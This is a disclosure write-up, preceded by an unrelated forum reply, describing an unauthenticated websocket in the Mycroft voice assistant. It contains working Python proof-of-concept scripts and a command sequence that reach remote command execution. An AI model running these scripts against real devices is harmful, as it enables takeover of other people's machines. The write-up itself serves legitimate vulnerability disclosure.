=== Content from community.mycroft.ai_c8e994ad_20250125_234222.html ===


![Open Source Conversational AI Community](data:image/svg;base64...)
Loading

[Open Source Conversational AI Community](/)

# ["Zero Click" Remote Code Execution in Mycroft AI vocal assistant](/t/zero-click-remote-code-execution-in-mycroft-ai-vocal-assistant/3930)

[General Discussion](/c/general/5)

[btotharye](https://community.openconversational.ai/u/btotharye)

June 12, 2018, 10:50am

13

So if I refactored the current mycroft ha skill to accept a url without a port that should fix the skill for those using a reverse proxy or that donâ€™t use a port right?

And yes I own [www.geekedoutsolutions.com](http://www.geekedoutsolutions.com) ![:slight_smile:](https://community.openconversational.ai/images/emoji/twitter/slight_smile.png?v=5 ":slight_smile:")

[show post in topic](/t/zero-click-remote-code-execution-in-mycroft-ai-vocal-assistant/3930#post_13)

* [Home](/)
* [Categories](/categories)
* [FAQ/Guidelines](/guidelines)
* [Terms of Service](/tos)
* [Privacy Policy](/privacy)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



=== Content from github.com_3dc6facc_20250125_234224.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNhoya%2FMycroftAI-RCE)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNhoya%2FMycroftAI-RCE)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Nhoya%2FMycroftAI-RCE)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Nhoya](/Nhoya)
/
**[MycroftAI-RCE](/Nhoya/MycroftAI-RCE)**
Public

* [Notifications](/login?return_to=%2FNhoya%2FMycroftAI-RCE) You must be signed in to change notification settings
* [Fork
  22](/login?return_to=%2FNhoya%2FMycroftAI-RCE)
* [Star
   53](/login?return_to=%2FNhoya%2FMycroftAI-RCE)

"Zero Click" Remote Code Execution in Mycroft AI vocal assistant

[53
stars](/Nhoya/MycroftAI-RCE/stargazers) [22
forks](/Nhoya/MycroftAI-RCE/forks) [Branches](/Nhoya/MycroftAI-RCE/branches) [Tags](/Nhoya/MycroftAI-RCE/tags) [Activity](/Nhoya/MycroftAI-RCE/activity)
 [Star](/login?return_to=%2FNhoya%2FMycroftAI-RCE)

 [Notifications](/login?return_to=%2FNhoya%2FMycroftAI-RCE) You must be signed in to change notification settings

* [Code](/Nhoya/MycroftAI-RCE)
* [Issues
  0](/Nhoya/MycroftAI-RCE/issues)
* [Pull requests
  0](/Nhoya/MycroftAI-RCE/pulls)
* [Actions](/Nhoya/MycroftAI-RCE/actions)
* [Projects
  0](/Nhoya/MycroftAI-RCE/projects)
* [Security](/Nhoya/MycroftAI-RCE/security)
* [Insights](/Nhoya/MycroftAI-RCE/pulse)

Additional navigation options

* [Code](/Nhoya/MycroftAI-RCE)
* [Issues](/Nhoya/MycroftAI-RCE/issues)
* [Pull requests](/Nhoya/MycroftAI-RCE/pulls)
* [Actions](/Nhoya/MycroftAI-RCE/actions)
* [Projects](/Nhoya/MycroftAI-RCE/projects)
* [Security](/Nhoya/MycroftAI-RCE/security)
* [Insights](/Nhoya/MycroftAI-RCE/pulse)

# Nhoya/MycroftAI-RCE

   Â master[Branches](/Nhoya/MycroftAI-RCE/branches)[Tags](/Nhoya/MycroftAI-RCE/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commitÂ History[5 Commits](/Nhoya/MycroftAI-RCE/commits/master/) | | |
| [PoC.gif](/Nhoya/MycroftAI-RCE/blob/master/PoC.gif "PoC.gif") | | [PoC.gif](/Nhoya/MycroftAI-RCE/blob/master/PoC.gif "PoC.gif") |  |  |
| [PoC.py](/Nhoya/MycroftAI-RCE/blob/master/PoC.py "PoC.py") | | [PoC.py](/Nhoya/MycroftAI-RCE/blob/master/PoC.py "PoC.py") |  |  |
| [README.md](/Nhoya/MycroftAI-RCE/blob/master/README.md "README.md") | | [README.md](/Nhoya/MycroftAI-RCE/blob/master/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# "Hey Mycroft, we've got a Problem"

Getting "Zero Click" Remote Code Execution in Mycroft AI vocal assistant

[![Mycroft AI](https://camo.githubusercontent.com/0c4271bfaa36d590ad77af95bfac97eb7c1cda15d17a17833f0e078877135bd1/68747470733a2f2f646d7479796c717677677978772e636c6f756466726f6e742e6e65742f696e7374616e6365732f3133322f75706c6f6164732f696d616765732f637573746f6d5f696d6167652f696d6167652f3436362f6e6f726d616c5f39623934613232352d383630352d346437382d383264322d3463353966363938316335372e6a7067)](https://camo.githubusercontent.com/0c4271bfaa36d590ad77af95bfac97eb7c1cda15d17a17833f0e078877135bd1/68747470733a2f2f646d7479796c717677677978772e636c6f756466726f6e742e6e65742f696e7374616e6365732f3133322f75706c6f6164732f696d616765732f637573746f6d5f696d6167652f696d6167652f3436362f6e6f726d616c5f39623934613232352d383630352d346437382d383264322d3463353966363938316335372e6a7067)

## Introduction

During my journey contributing to open source I was working with my friend [Matteo De Carlo](https://github.com/portaloffreedom) on an [AUR Package](https://git.covolunablu.org/portaloffreedom/plasma-mycroft-PKGBUILD) of a really interesting project called [Mycroft AI](https://mycroft.ai). It's an AI-powered vocal assistant started with a [crowdfunding campaign](https://www.kickstarter.com/projects/aiforeveryone/mycroft-an-open-source-artificial-intelligence-for) in 2015 and a [more recent one](https://www.indiegogo.com/projects/mycroft-mark-ii-the-open-voice-assistant#/) that allowed Mycroft to produce their Mark-I and Mark-II devices. It's also running on Linux Desktop/Server, Raspberry PI and will be available soonâ„¢ on [Jaguar F-Type](https://www.youtube.com/watch?v=6GHmzbXp_jY) and [Land Rover](https://mycroft.ai/blog/mycroft-welcomes-jaguar-land-rover-new-investor/)

## Digging in the source code

While looking at the [source code](https://github.com/MycroftAI/mycroft-core) I found an interesting point: [here](https://github.com/MycroftAI/mycroft-core/blob/1f4c98f29ceb6a7981474f1620441e43aa364d00/mycroft/messagebus/service/main.py#L28-L57)

```
...
host = config.get("host")
port = config.get("port")
route = config.get("route")
validate_param(host, "websocket.host")
validate_param(port, "websocket.port")
validate_param(route, "websocket.route")

routes = [
        (route, WebsocketEventHandler)
]
application = web.Application(routes, **settings)
application.listen(port, host)
ioloop.IOLoop.instance().start()
...
```

it defines a websocket server that uses to get instructions from the remote clients (like the [Android one](https://github.com/MycroftAI/Mycroft-Android)). The settings for the websocket server are defined in [mycroft.conf](https://github.com/MycroftAI/mycroft-core/blob/aa594aebea99eebd0109ad013b71a2210f2b72f4/mycroft/configuration/mycroft.conf#L111-L117)

```
// The mycroft-core messagebus' websocket
  "websocket": {
    "host": "0.0.0.0",
    "port": 8181,
    "route": "/core",
    "ssl": false
},
```

So there is a websocket server that doesn't require authentication that by default is exposed on `0.0.0.0:8181/core`. Let's test it ðŸ˜‰

```
#!/usr/bin/env python

import asyncio
import websockets

uri = "ws://myserver:8181/core"
command = "say pwned"

async def sendPayload():
    async with websockets.connect(uri) as websocket:
        await websocket.send("{\"data\": {\"utterances\": [\""+command+"\"]}, \"type\": \"recognizer_loop:utterance\", \"context\": null}")

asyncio.get_event_loop().run_until_complete(sendPayload())
```

And magically we have an answer from the vocal assistant saying `pwned`!

Well, now we can have Mycroft pronounce stuff remotely, but this is not a really big finding unless you want to scare your friends, right?

[![Trump WRONG](https://camo.githubusercontent.com/e6d2df419eeabf0d610b1e1f4b7bf50a7e8b15d892b5d0d4ae704075a06ab9c8/68747470733a2f2f6d65646961312e74656e6f722e636f6d2f696d616765732f38613461393964336264363762613864396130323563333665646634613632342f74656e6f722e676966)](https://camo.githubusercontent.com/e6d2df419eeabf0d610b1e1f4b7bf50a7e8b15d892b5d0d4ae704075a06ab9c8/68747470733a2f2f6d65646961312e74656e6f722e636f6d2f696d616765732f38613461393964336264363762613864396130323563333665646634613632342f74656e6f722e676966)

## The skills system

Digging deeper we can see that Mycroft has a skills system and a default skill that can install others skills (pretty neat, right?)

How is a skill composed? From what we can see from the documentation a default skill is composed by:

* `dialog/en-us/command.dialog` contains the vocal command that will trigger the skill
* `vocab/en-us/answer.voc` contains the answer that Mycroft will pronounce
* `requirements.txt` contains the requirements for the skill that will be installed with `pip`
* `__int__.py` contains the main function of the skill and will be loaded when the skill is triggered

## What can I do now?

I could create a malicious skill that when triggered runs arbitrary code on the remote machine, but unfortunately this is not possible via vocal command unless the URL of the skill is not whitelisted via the online website. So this is possible but will be a little tricky.

### So I'm done?

Not yet. I found out that I can trigger skills remotely and that is possible to execute commands on a remote machine convincing the user to install a malicious skill. I may have enough to submit a vulnerability report. But maybe I can do a bit better...

## Getting a remote shell using default skills

We know that Mycroft has some [default skills](https://github.com/MycroftAI/mycroft-skills) like `open` that will open an application and others that are whitelisted but not installed. Reading through to the list, I found a really interesting skill called `skill-autogui`, whose description says `Manipulate your mouse and keyboard with Mycroft`. **We got it!**

Let's try to combine everything we found so far into a PoC:

```
#!/usr/bin/env python

import sys
import asyncio
import websockets
import time

cmds = ["mute audio"] + sys.argv[1:]
uri = "ws://myserver:8181/core"

async def sendPayload():
    for payload in cmds:
        async with websockets.connect(uri) as websocket:
            await websocket.send("{\"data\": {\"utterances\": [\""+payload+"\"]}, \"type\": \"recognizer_loop:utterance\", \"context\": null}")
            time.sleep(1)

asyncio.get_event_loop().run_until_complete(sendPayload())
```

Running the exploit with `python pwn.py "install autogui" "open xterm" "type echo pwned" "press enter"` allowed me to finally get a command execution on a Linux machine.

[![PoC](/Nhoya/MycroftAI-RCE/raw/master/PoC.gif)](/Nhoya/MycroftAI-RCE/blob/master/PoC.gif)

[![WASSUUUUUUUUUUUUUUUUUUUUUUUUP](https://camo.githubusercontent.com/38f50f7d0b9a6471230b3a656c16a370e8a23d7c9d1630242e90530d552dad27/68747470733a2f2f7468756d62732e6766796361742e636f6d2f506c6561736564456475636174656447616c61682d73697a655f726573747269637465642e676966)](https://camo.githubusercontent.com/38f50f7d0b9a6471230b3a656c16a370e8a23d7c9d1630242e90530d552dad27/68747470733a2f2f7468756d62732e6766796361742e636f6d2f506c6561736564456475636174656447616c61682d73697a655f726573747269637465642e676966)

## *Notes*

* `open xterm` was needed because my test Linux environment had a DE installed, on a remote server the commands will be executed directly on TTY so this step is not nesessary.
* The skill branching had a [big change](https://mycroft.ai/blog/skill-branching-18-02/) and now some skills are not (yet) available (autogui is one of them) but this is not the real point. Mycroft has skills to interact with domotic houses and other services that can still be manipulated (the lack of imagination is the limit here). The vulnerability lies in the lack of authentication for the ws.

## Affected devices

All the devices running Mycroft <= ? with the websocket server exposed (Mark-I has the websocket behind a firewall by default)

## Interested in my work?

Follow me on:

* Twitter: `@0x7a657461`
* Linkedin: <https://linkedin.com/in/0xzeta>
* GitHub: <https://github.com/Nhoya>

## Timeline

* 08/03/2018 Vulnerability found
* 09/03/2018 Vulnerability reported
* 13/03/2018 The CTO answered that they are aware of this problem and are currently working on a patch
* 06/06/2018 The CTO said that they have no problem with the release of the vulnerability and will add a warning to remember the user to use a firewall `Â¯\_(ãƒ„)_/Â¯`
* 09/06/2018 Public disclosure

## About

"Zero Click" Remote Code Execution in Mycroft AI vocal assistant

### Topics

[exploit](/topics/exploit "Topic: exploit")
[rce](/topics/rce "Topic: rce")
[vulnerability](/topics/vulnerability "Topic: vulnerability")
[mycroft](/topics/mycroft "Topic: mycroft")

### Resources

[Readme](#readme-ov-file)

[Activity](/Nhoya/MycroftAI-RCE/activity)
### Stars

[**53**
stars](/Nhoya/MycroftAI-RCE/stargazers)
### Watchers

[**6**
watching](/Nhoya/MycroftAI-RCE/watchers)
### Forks

[**22**
forks](/Nhoya/MycroftAI-RCE/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FNhoya%2FMycroftAI-RCE&report=Nhoya+%28user%29)

## [Releases](/Nhoya/MycroftAI-RCE/releases)

No releases published

## [Packages 0](/users/Nhoya/packages?repo_name=MycroftAI-RCE)

No packages published

## Languages

* [Python
  100.0%](/Nhoya/MycroftAI-RCE/search?l=python)

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.


